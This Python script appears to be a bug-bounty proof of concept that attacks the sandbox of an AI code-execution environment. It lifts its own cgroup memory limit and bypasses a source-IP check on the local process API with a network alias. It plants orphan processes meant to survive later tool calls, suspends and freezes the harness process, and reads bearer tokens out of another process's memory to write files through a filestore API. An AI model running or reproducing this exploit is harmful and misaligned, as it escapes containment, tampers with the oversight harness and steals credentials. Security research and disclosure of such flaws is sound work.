#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# MEDIAFIT v9.0
#  FIX 137: oom_score_adj on victim + deterministic oom_kill_disable test + PASS2 own file
#  FIX attach: field matrix to obtain AttachedToProcess (socket closes after ProcessWithSameIdRunning)
#  FIX variants: enumerate on ProcessCreated sockets (pipelined control)
#  NEW: survivor table, cgroup-persistence counter, freezer differential proof
import os, re, sys, json, time, base64, struct, socket, fcntl, hashlib
import random, string, subprocess, traceback, urllib.request, urllib.error

PASS   = 2 if "--pass2" in sys.argv else 1
VER    = "9.0"
NONCE  = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(4))
OUT    = "/mnt/user-data/outputs/mediafit-report.txt"
OUTP2  = "/mnt/user-data/outputs/mediafit-report-pass2.txt"
TMP2   = "/dev/shm/mf_pass2.txt"
STATES = ["/root/.mfstate.json", "/tmp/mfstate.json"]
MARKER = "/root/.mf_vm.json"
ALIAS  = "eth0:0"; AIP = "192.0.2.3"; TGT = ("127.0.0.1", 2024)
CG     = "/sys/fs/cgroup"
UNLIM  = "9223372036854771712"
BASE   = "https://api.anthropic.com/v1/filestore/fs/"

L = []
def W(s=""):
    L.append(str(s))
    try:
        with open(TMP2 if PASS == 2 else OUT, "w") as f: f.write("\n".join(L) + "\n")
    except Exception: pass
def sec(t): W(""); W("=" * 70); W("### " + t); W("=" * 70)
def rd(p):
    try: return open(p, "rb").read().decode("utf-8", "replace")
    except Exception as e: return "ERR:" + repr(e)
def wr(p, v):
    with open(p, "w") as f: f.write(str(v))
def sh(c, t=10):
    try:
        p = subprocess.run(c, shell=True, capture_output=True, timeout=t)
        return (p.stdout + p.stderr).decode("utf-8", "replace")
    except Exception as e: return "ERR:" + repr(e)

def pstat(pid):
    try:
        d = open("/proc/%d/stat" % pid, "rb").read().decode("utf-8", "replace")
        return d[d.rfind(")") + 2:].split()[0]
    except Exception: return "?"
def ppid_of(pid):
    try:
        d = open("/proc/%d/stat" % pid, "rb").read().decode("utf-8", "replace")
        return int(d[d.rfind(")") + 2:].split()[1])
    except Exception: return -1
def poll_state(pid, want, secs=2.0):
    t0 = time.time(); last = pstat(pid)
    while time.time() - t0 < secs:
        if last == want: return "%s (in %.2fs)" % (last, time.time() - t0)
        time.sleep(0.05); last = pstat(pid)
    return "TIMEOUT:" + last
def t_scan(): return [int(p) for p in os.listdir("/proc") if p.isdigit() and pstat(int(p)) == "T"]

# ---------- net ----------
def if_addr(name):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        r = fcntl.ioctl(s, 0x8915, struct.pack("16sH", name.encode(), socket.AF_INET) + b"\x00" * 14)
        return socket.inet_ntoa(r[20:24])
    except Exception: return None
    finally: s.close()
def add_alias():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); e1 = ""
    try:
        if if_addr(ALIAS) == AIP: return "already-up"
        ifr = struct.pack("16sH", ALIAS.encode(), socket.AF_INET) + b"\x00\x00" + socket.inet_aton(AIP) + b"\x00" * 8
        fcntl.ioctl(s, 0x8916, ifr)
        i2 = struct.pack("16sH", ALIAS.encode(), 0) + b"\x00" * 14
        fl = struct.unpack_from("H", fcntl.ioctl(s, 0x8913, i2), 16)[0]
        fcntl.ioctl(s, 0x8914, struct.pack("16sH", ALIAS.encode(), fl | 1) + b"\x00" * 14)
        if if_addr(ALIAS) == AIP: return "ok (addr=%s)" % if_addr(ALIAS)
        e1 = "ioctl ran addr=%s" % if_addr(ALIAS)
    except Exception as e: e1 = repr(e)
    finally: s.close()
    for c in ["ip addr add %s/32 dev eth0 label %s" % (AIP, ALIAS),
              "ip addr add %s/32 dev eth0" % AIP,
              "ifconfig %s %s netmask 255.255.255.255 up" % (ALIAS, AIP)]:
        sh(c)
        if if_addr(ALIAS) == AIP: return "fallback:" + c
    return "FAIL(%s)" % e1
def ws_connect(src=(AIP, 0), timeout=5.0):
    s = socket.create_connection(TGT, timeout=timeout, source_address=src)
    k = base64.b64encode(os.urandom(16)).decode()
    s.sendall(("GET / HTTP/1.1\r\nHost: 127.0.0.1:2024\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
               "Sec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n\r\n" % k).encode())
    buf = b""
    while b"\r\n\r\n" not in buf:
        d = s.recv(4096)
        if not d: raise IOError("closed in handshake: %r" % buf[:60])
        buf += d
    if "101" not in buf.split(b"\r\n", 1)[0].decode("utf-8", "replace"): raise IOError("no 101")
    return s
def ws_send(s, obj):
    data = (obj if isinstance(obj, str) else json.dumps(obj)).encode()
    n = len(data); h = bytearray([0x81])
    if n < 126: h.append(0x80 | n)
    elif n < 65536: h.append(0x80 | 126); h += struct.pack(">H", n)
    else: h.append(0x80 | 127); h += struct.pack(">Q", n)
    m = os.urandom(4); h += m
    s.sendall(bytes(h) + bytes(b ^ m[i % 4] for i, b in enumerate(data)))
def ws_recv(s, timeout=1.0):
    s.settimeout(timeout)
    try: h = s.recv(2)
    except socket.timeout: return None
    except Exception: return "ERR:recv"
    if not h: return "CLOSE"
    while len(h) < 2:
        d = s.recv(2 - len(h))
        if not d: break
        h += d
    op = h[0] & 0x0F; n = h[1] & 0x7F
    if n == 126: n = struct.unpack(">H", s.recv(2))[0]
    elif n == 127: n = struct.unpack(">Q", s.recv(8))[0]
    pl = b""
    while len(pl) < n:
        d = s.recv(n - len(pl))
        if not d: break
        pl += d
    if op == 0x8: return "CLOSE:" + pl.decode("utf-8", "replace")
    if op == 0x9:
        s.sendall(b"\x8a\x80" + os.urandom(4)); return ws_recv(s, timeout)
    return pl.decode("utf-8", "replace")
def ws_drain(s, timeout=0.6):
    out = []
    while True:
        r = ws_recv(s, timeout)
        if r is None: break
        out.append(r)
        if str(r).startswith("CLOSE"): break
    return out

def spec(prog, args, reattach=True, mem=268435456, timeout=3600):
    return {"name": prog, "args": args, "env_vars": {}, "clear_env": False,
            "allow_process_id_reuse": True, "reattachable": reattach,
            "timeout": timeout, "uid": 0, "gid": 0, "memory_limit_bytes": mem}
def pconn(pid, cr): return {"process_id": pid, "allow_process_id_reuse": True, "create_req": cr}
def nid(): return os.urandom(16).hex()
TRUE = spec("/bin/sh", ["-c", "true"])

def http(url, method="POST", body=None, headers=None, timeout=15):
    rq = urllib.request.Request(url, data=body, method=method)
    for k, v in (headers or {}).items(): rq.add_header(k, v)
    try:
        r = urllib.request.urlopen(rq, timeout=timeout); return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return -1, repr(e).encode()
def find_tokens(budget=20.0):
    toks = []; t0 = time.time()
    for p in sorted(os.listdir("/proc")):
        if not p.isdigit() or time.time() - t0 > budget: continue
        if "rclone" not in rd("/proc/%s/cmdline" % p).replace("\x00", " "): continue
        try: mem = open("/proc/%s/mem" % p, "rb", buffering=0)
        except Exception: continue
        regs = []
        try:
            for l in open("/proc/%s/maps" % p):
                q = l.split()
                if len(q) < 2 or "r" not in q[1]: continue
                a, b = q[0].split("-"); a = int(a, 16); b = int(b, 16)
                if 0 < b - a <= 64 * 1024 * 1024: regs.append((a, b))
        except Exception: pass
        for a, b in regs:
            try: mem.seek(a); data = mem.read(b - a)
            except Exception: continue
            for m in re.finditer(rb"eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{20,}", data):
                t = m.group(0).decode(); h, pl, sg = t.split(".")
                if len(sg) > 86: t = h + "." + pl + "." + sg[:86]
                if t not in toks: toks.append(t)
        try: mem.close()
        except Exception: pass
    return toks
def claims_of(t):
    try:
        pl = t.split(".")[1]; pl += "=" * (-len(pl) % 4)
        return json.loads(base64.urlsafe_b64decode(pl))
    except Exception: return {}

def cg_procs(hid):
    try: return [int(x) for x in open("%s/memory/process_api/%s/cgroup.procs" % (CG, hid)).read().split()]
    except Exception: return []

def _pre_oom():
    try: open("/proc/self/oom_score_adj", "w").write("900")
    except Exception: pass

# ======================================================================
def main():
    sec("PASS %d | RUN STAMP ver=%s nonce=%s t=%s" % (PASS, VER, NONCE, time.strftime("%Y-%m-%d %H:%M:%S")))
    boot = rd("/proc/sys/kernel/random/boot_id").strip()
    mk = {}
    if os.path.exists(MARKER):
        try: mk = json.load(open(MARKER))
        except Exception: mk = {}
    W("  boot_id=%s uptime=%s" % (boot, rd("/proc/uptime").strip()))
    W("  VM MARKER: first_seen=%s SAME_VM=%s" % (mk.get("t"), mk.get("boot") == boot))
    if not mk: json.dump({"boot": boot, "t": time.time()}, open(MARKER, "w"))

    mypid = os.getpid(); chain = []; p = mypid
    while p and p != 1 and len(chain) < 20:
        chain.append(p); p = ppid_of(p)
        if p <= 0: break
    H = chain[-1] if chain else -1
    HID = ""
    for l in rd("/proc/self/cgroup").splitlines():
        if "process_api/" in l: HID = l.strip().split("process_api/")[-1]
    W("  self=%d chain=%s harness=%d harness_id=%s oom_score_adj=%s" % (
        mypid, chain, H, HID, rd("/proc/self/oom_score_adj").strip()))
    W("  MemTotal=%s Swap=%s" % ([x for x in rd("/proc/meminfo").splitlines() if "MemTotal" in x],
                                 [x for x in rd("/proc/meminfo").splitlines() if "SwapTotal" in x]))

    md = CG + "/memory/process_api/" + HID
    # ---- HEAL stale state from a previous crashed run ----
    try:
        lv = int(rd(md + "/memory.limit_in_bytes").strip())
        if lv < 10 ** 15:
            wr(md + "/memory.limit_in_bytes", UNLIM); W("  HEAL: stale limit %d -> %s" % (lv, rd(md + "/memory.limit_in_bytes").strip()))
    except Exception: pass
    try:
        pv = rd(CG + "/pids/mf_pids/pids.max").strip()
        if pv not in ("max", ""):
            wr(CG + "/pids/mf_pids/pids.max", "max"); W("  HEAL: pids.max %s -> max" % pv)
    except Exception: pass
    try:
        if rd(CG + "/memory/process_api/" + HID + "/memory.oom_control").find("oom_kill_disable 1") >= 0:
            wr(md + "/memory.oom_control", "0"); W("  HEAL: oom_kill_disable -> 0")
    except Exception: pass

    sec("0b. SURVIVORS FROM EARLIER TOOL CALLS  <<< PERSISTENCE EVIDENCE")
    pa = CG + "/memory/process_api"
    try: allc = sorted([n for n in os.listdir(pa) if os.path.isdir(os.path.join(pa, n))])
    except Exception: allc = []
    foreign = [n for n in allc if n != HID]
    W("  process_api cgroups: ours=%s  FOREIGN=%s" % (HID, foreign))
    for n in foreign:
        ps = cg_procs(n)
        W("  [FOREIGN %s] pids=%s" % (n, ps))
        for q in ps:
            W("      pid %-5d ppid=%-3d state=%s cmd=%s" % (q, ppid_of(q), pstat(q),
              rd("/proc/%d/cmdline" % q).replace("\x00", " ").strip()[:70]))
    W("  full non-kthread process tree:")
    for q in sorted(os.listdir("/proc"), key=lambda x: int(x) if x.isdigit() else 0):
        if not q.isdigit(): continue
        cl = rd("/proc/%s/cmdline" % q).replace("\x00", " ").strip()
        if not cl: continue
        m = re.search(r"memory:(/\S*)", rd("/proc/%s/cgroup" % q))
        W("      pid %-5s ppid=%-4s st=%s cg=%s" % (q, ppid_of(int(q)), pstat(int(q)), (m.group(1) if m else "?")))

    sec("0c. OUR PERSISTED CGROUP OBJECTS + TAMPER-EVIDENT COUNTER")
    for c, s2 in [("memory", "mf_pids"), ("pids", "mf_pids"), ("freezer", "mf_guest")]:
        pp = "%s/%s/%s" % (CG, c, s2)
        W("  %-42s exists=%s" % (pp, os.path.isdir(pp)))
    ev = rd(CG + "/pids/mf_pids/pids.events").strip().replace("\n", " ")
    W("  mf_pids pids.events = [%s]   <-- counter survived previous tool calls" % ev)

    sec("1. /proc SURFACE")
    W("  /proc/1/limits: %s" % [x.strip() for x in rd("/proc/1/limits").splitlines() if "processes" in x or "open files" in x])
    try:
        fds = sorted(os.listdir("/proc/1/fd"), key=int)
        W("  /proc/1/fd count=%d  readlink: %s" % (len(fds), rd("/proc/1/fdinfo/1")[:60] if os.path.exists("/proc/1/fdinfo/1") else "n/a"))
    except Exception as e: W("  /proc/1/fd err %r" % e)
    W("  /proc/net/tcp (look for 030200C0 -> 0100007F:07E8):")
    for l in rd("/proc/net/tcp").splitlines():
        if "07E8" in l or "0100007F" in l: W("      " + l.strip()[:100])

    sec("2. *** memory limit: deterministic test (oom_kill_disable) + real OOM kill ***")
    try:
        lim = rd(md + "/memory.limit_in_bytes").strip(); us = int(rd(md + "/memory.usage_in_bytes").strip())
        W("  BEFORE limit=%s usage=%d" % (lim, us))
        tgt = us + 24 * 1024 * 1024
        wr(md + "/memory.limit_in_bytes", str(tgt)); W("  WROTE limit=%d readback=%s" % (tgt, rd(md + "/memory.limit_in_bytes").strip()))
        # A) deterministic: no kill
        wr(md + "/memory.oom_control", "1"); W("  oom_kill_disable=1")
        try:
            cp = subprocess.run([sys.executable, "-c", "a=bytearray(64*1024*1024)\nfor i in range(0,len(a),4096): a[i]=1\nprint('ok')"],
                                capture_output=True, timeout=12)
            W("  A) child finished rc=%s (limit not hit?)" % cp.returncode)
        except subprocess.TimeoutExpired:
            W("  A) child BLOCKED in memcg OOM (deterministic) -> killing it")
        W("  A) under_oom=%s failcnt=%s" % (
            [x for x in rd(md + "/memory.oom_control").splitlines() if "under_oom" in x],
            rd(md + "/memory.failcnt").strip()))
        wr(md + "/memory.oom_control", "0")
        # B) real kill, victim forced by oom_score_adj=900
        cp = subprocess.run([sys.executable, "-c", "a=bytearray(64*1024*1024)\nfor i in range(0,len(a),4096): a[i]=1\nprint('ok')"],
                            capture_output=True, timeout=30, preexec_fn=_pre_oom)
        W("  B) child rc=%s (SIGKILL=-9 means the kernel OOM-killed it)" % cp.returncode)
        W("  B) oom_control=%s failcnt=%s" % (rd(md + "/memory.oom_control").strip().replace("\n", " | "), rd(md + "/memory.failcnt").strip()))
        wr(md + "/memory.limit_in_bytes", lim); W("  RESTORED limit=%s" % rd(md + "/memory.limit_in_bytes").strip())
    except Exception as e: W("  mem test err %r" % e)

    sec("3. pids.max via self-created cgroup (events counter is cumulative)")
    try:
        d = CG + "/pids/mf_pids"
        try: os.mkdir(d)
        except FileExistsError: pass
        wr(d + "/cgroup.procs", str(os.getpid())); W("  moved self -> %s" % rd(d + "/cgroup.procs").strip())
        mx = rd(d + "/pids.max").strip()
        W("  BEFORE events=[%s]" % rd(d + "/pids.events").strip().replace("\n", " "))
        kids = []; fails = 0
        try:
            wr(d + "/pids.max", "3")
            for _ in range(6):
                try:
                    k = os.fork()
                    if k == 0: time.sleep(1.0); os._exit(0)
                    kids.append(k)
                except OSError: fails += 1
            W("  pids.max=3 -> fork x6 ok=%d EAGAIN=%d" % (len(kids), fails))
            W("  AFTER events=[%s]" % rd(d + "/pids.events").strip().replace("\n", " "))
        finally:
            for k in kids:
                try: os.kill(k, 9)
                except Exception: pass
            try: os.waitpid(-1, 1)
            except Exception: pass
            wr(d + "/pids.max", mx)
        wr(CG + "/pids/cgroup.procs", str(os.getpid())); W("  moved self back")
    except Exception as e: W("  pids err %r" % e)

    sec("4. BYPASS: before/after (HackerOne evidence pair)")
    W("  add_alias -> %s" % add_alias())
    for src in [("192.0.2.2", 0), (AIP, 0)]:
        try:
            s = ws_connect(src=src, timeout=4); W("  src %-11s -> 101 OK (bypass works)" % src[0]); s.close()
        except Exception as e: W("  src %-11s -> %r" % (src[0], e))

    sec("5. ORPHAN / SURVIVOR control")
    saved = {}
    for sp in STATES:
        if os.path.exists(sp):
            try: saved = json.load(open(sp)); break
            except Exception: pass
    oid = saved.get("process_id", "")
    if oid and oid in allc:
        W("  --> REATTACH to live survivor %s (created by an EARLIER harness)" % oid)
        try:
            s = ws_connect(); ws_send(s, pconn(oid, TRUE)); W("  attach r1 = %s" % ws_recv(s, 2.0))
            W("  LIVE STDOUT = %s" % ws_drain(s, 1.2)[:5])
            ws_send(s, {"SendSignal": {"signal": 0}}); W("  Signal0 -> %s" % ws_recv(s, 1.0))
            s.close()
        except Exception as e: W("  reattach err %r" % e)
    else:
        W("  --> CREATE new orphan")
        o = nid()
        try:
            s = ws_connect(); ws_send(s, pconn(o, spec("/bin/sh", ["-c", "i=0; while true; do echo ORPHAN_$i; i=$((i+1)); sleep 1; done"], True)))
            W("  create r1 = %s" % ws_recv(s, 3.0)); W("  stdout = %s" % ws_drain(s, 1.2)[:4]); s.close()
            for sp in STATES:
                try: json.dump({"process_id": o, "boot": boot}, open(sp, "w"))
                except Exception: pass
            W("  saved orphan %s" % o)
        except Exception as e: W("  create err %r" % e)

    sec("6. *** ATTACH MATRIX -> then SIGSTOP the harness (T) ***")
    cands = [
        ("req reuse=T reatt=T", {"process_id": HID, "allow_process_id_reuse": True, "create_req": TRUE}),
        ("req reuse=T reatt=F", {"process_id": HID, "allow_process_id_reuse": True, "create_req": spec("/bin/sh", ["-c", "true"], False)}),
        ("req reuse=F reatt=T", {"process_id": HID, "allow_process_id_reuse": False, "create_req": TRUE}),
        ("req reuse=F reatt=F", {"process_id": HID, "allow_process_id_reuse": False, "create_req": spec("/bin/sh", ["-c", "true"], False)}),
        ("noreq reuse=T", {"process_id": HID, "allow_process_id_reuse": True}),
        ("noreq reuse=F", {"process_id": HID, "allow_process_id_reuse": False}),
        ("pid only", {"process_id": HID}),
        ("+top reattachable", {"process_id": HID, "allow_process_id_reuse": True, "create_req": TRUE, "reattachable": True}),
        ("+container_name", {"process_id": HID, "allow_process_id_reuse": True, "create_req": TRUE, "expected_container_name": HID}),
    ]
    good = None
    for nm, p in cands:
        try:
            s = ws_connect(); ws_send(s, p); r = ws_recv(s, 2.5)
            W("  %-22s -> %s" % (nm, r))
            if r and ("Attached" in str(r) or "Created" in str(r)):
                if good is None: good = (nm, p)
            s.close()
        except Exception as e: W("  %-22s -> ERR %r" % (nm, e))
    if good:
        W("  ATTACH WORKS WITH: %s" % good[0])
        W("  harness pid=%d state=%s" % (H, pstat(H)))
        try:
            s = ws_connect(); ws_send(s, good[1]); W("  r1=%s" % ws_recv(s, 2.0))
            ws_send(s, {"SendSignal": {"signal": 19}}); W("  STOP resp=%s" % ws_recv(s, 1.5))
            W("  *** /proc/%d/stat AFTER STOP = %s (T = SIGSTOP) ***  T-scan=%s" % (H, poll_state(H, "T", 3.0), t_scan()))
            ws_send(s, {"SendSignal": {"signal": 18}})
            W("  AFTER CONT = %s" % poll_state(H, "S", 2.0))
            s.close()
        except Exception as e:
            W("  signal err %r" % e)
            try: os.kill(H, 18)
            except Exception: pass

    sec("7. *** FREEZER differential proof (cgroupfs, no API) ***")
    try:
        fz = CG + "/freezer"; g = fz + "/mf_guest"
        try: os.mkdir(g)
        except FileExistsError: pass
        wd = subprocess.Popen(["/bin/sh", "-c",
             "sleep 8; grep -q FROZEN %s/freezer.state && echo THAWED > %s/freezer.state" % (g, g)],
             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
        W("  watchdog=%d (root freezer cgroup)" % wd.pid)
        wr(g + "/cgroup.procs", str(H))
        W("  moved harness %d in; procs=%s state=%s" % (H, rd(g + "/cgroup.procs").strip(), rd(g + "/freezer.state").strip()))
        W("  BEFORE: harness=%s  self=%s  (control: self is NOT in mf_guest)" % (pstat(H), pstat(mypid)))
        t0 = time.time()
        wr(g + "/freezer.state", "FROZEN")
        W("  AFTER FROZEN: state=%s self_freezing=%s parent_freezing=%s" % (
            rd(g + "/freezer.state").strip(), rd(g + "/freezer.self_freezing").strip(), rd(g + "/freezer.parent_freezing").strip()))
        W("  *** harness /proc/%d/stat = %s  (D = cgroup-v1 freezer signature) ***  self /proc/%d/stat = %s" % (
            H, pstat(H), mypid, pstat(mypid)))
        W("  /proc/%d/status State: %s" % (H, [x.strip() for x in rd("/proc/%d/status" % H).splitlines() if x.startswith("State")]))
        wr(g + "/freezer.state", "THAWED")
        W("  AFTER THAWED: state=%s harness=%s self=%s elapsed=%.2fs" % (
            rd(g + "/freezer.state").strip(), pstat(H), pstat(mypid), time.time() - t0))
        try:
            wr(fz + "/cgroup.procs", str(H)); W("  harness moved back to freezer root")
        except Exception as e: W("  move-back err %r" % e)
    except Exception as e: W("  freezer err %r" % e)

    sec("8. VARIANT ENUMERATION on ProcessCreated sockets (pipelined control)")
    o = nid(); cr = spec("/bin/sh", ["-c", "sleep 25"], False, 67108864)
    # pipelined bogus test
    try:
        s = ws_connect(); ws_send(s, pconn(o, cr)); ws_send(s, {"__BOGUS2__": None})
        for f in ws_drain(s, 1.5): W("  PIPELINED-BOGUS >> %s" % f)
        s.close()
    except Exception as e: W("  pipelined err %r" % e)
    for c in ["Attach", "Detach", "KeepAlive", "Closed", "Resize", "PtyResize", "Stdin", "StdIn",
              "StdinEOF", "StdInEOF", "Eof", "ExpectStdIn", "ExpectStdErr", "Signal", "Terminate",
              "Shutdown", "Close", "Ping", "Pong", "StdInClose", "SetTty", "ResizeTty", "Heartbeat"]:
        try:
            oo = nid()
            s = ws_connect(); ws_send(s, pconn(oo, cr)); r1 = ws_recv(s, 2.0)
            ws_send(s, {c: None}); r2 = ws_drain(s, 0.6)
            bad = any("unknown variant" in x for x in r2)
            W("  %-12s r1=%-16s -> %-12s %s" % (c, str(r1)[:16], "INVALID" if bad else ("valid/silent" if not r2 else "VALID"), str(r2)[:110]))
            s.close()
        except Exception as e: W("  %-12s ERR %r" % (c, e))

    sec("9. C2PA metadata lie")
    toks = find_tokens(); pick = None
    for t in toks[:12]:
        c = claims_of(t)
        if pick is None and "/outputs" in (c.get("allowed_roots") or []): pick = (t, c)
    if not pick: W("  no /outputs token (%d)" % len(toks))
    else:
        tok, cl = pick; fsid = cl.get("filesystem_id")
        hdr = {"Authorization": "Bearer " + tok, "Content-Type": "application/json", "Connect-Protocol-Version": "1"}
        svg = b'<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="10" height="10" fill="#0af"/></svg>'
        path = "/outputs/__mf_%s_%d.svg" % (NONCE, PASS); bnd = "----mf" + NONCE
        body = (("--%s\r\nContent-Disposition: form-data; name=\"params\"\r\nContent-Type: application/json\r\n\r\n" % bnd).encode()
                + json.dumps({"filesystem_id": fsid, "path": path, "media_type": "image/svg+xml"}).encode() + b"\r\n"
                + ("--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"f.svg\"\r\nContent-Type: image/svg+xml\r\n\r\n" % bnd).encode()
                + svg + b"\r\n" + ("--%s--\r\n" % bnd).encode())
        st, b2 = http(BASE + "createFile", "POST", body, {"Authorization": "Bearer " + tok, "Content-Type": "multipart/form-data; boundary=" + bnd})
        try: dec = json.loads(b2)["file"]["file"]["size"]
        except Exception: dec = "?"
        st3, b3 = http(BASE + "readFile", "POST", json.dumps({"filesystem_id": fsid, "path": path}).encode(), hdr)
        W("  createFile=%s declared=%s sent=%d | readFile=%s stored=%d | delta=%+d | md5_equal=%s" % (
            st, dec, len(svg), st3, len(b3), len(b3) - len(svg), hashlib.md5(svg).hexdigest() == hashlib.md5(b3).hexdigest()))
        W("  injected: %s" % b3[:120])

    sec("END PASS %d t=%s" % (PASS, time.strftime("%H:%M:%S")))

    if PASS == 1:
        try:
            with open(OUTP2, "w") as f: f.write("(PASS 2 running)\n")
            subprocess.run([sys.executable, os.path.abspath(__file__), "--pass2"], timeout=150,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            with open(OUT, "a") as f:
                f.write("\n" + "#" * 70 + "\n### ===== PASS 2 =====\n" + "#" * 70 + "\n" + rd(TMP2))
        except Exception as e:
            W("pass2 err %r" % e)
    else:
        try:
            with open(OUTP2, "w") as f: f.write("\n".join(L) + "\n")
        except Exception: pass

if __name__ == "__main__":
    try: main()
    except Exception:
        W("FATAL\n" + traceback.format_exc())